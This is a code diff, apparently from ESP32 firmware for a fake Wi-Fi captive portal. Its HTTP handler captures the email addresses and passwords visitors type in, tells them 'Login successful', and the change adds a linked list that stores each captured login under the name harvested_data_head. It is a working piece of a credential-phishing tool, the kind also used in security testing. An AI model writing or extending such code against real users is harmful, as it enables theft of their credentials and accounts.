@@ -101,6 +101,7 @@ static esp_err_t http_post_handler(httpd_req_t *req) {
     strncpy(login_data.email, email_val, sizeof(login_data.email) - 1);
     strncpy(login_data.password, password_val, sizeof(login_data.password) - 1);
     login_data.valid = true;
+    add_login_to_list(login_data);
 
     httpd_resp_sendstr(req, "Login successful");
     free(buf);
@@ -139,6 +140,15 @@ static httpd_handle_t start_webserver(void) {
 
 login_data_t get_captured_login(void) {
     return login_data;
+}
+
+void add_login_to_list(login_data_t new_data) {
+    ListNode* new_node = malloc(sizeof(ListNode));
+    if (!new_node) return;
+
+    new_node->data = new_data;
+    new_node->next = harvested_data_head;
+    harvested_data_head = new_node;
 }
 
 void stop_captive_portal(void) {
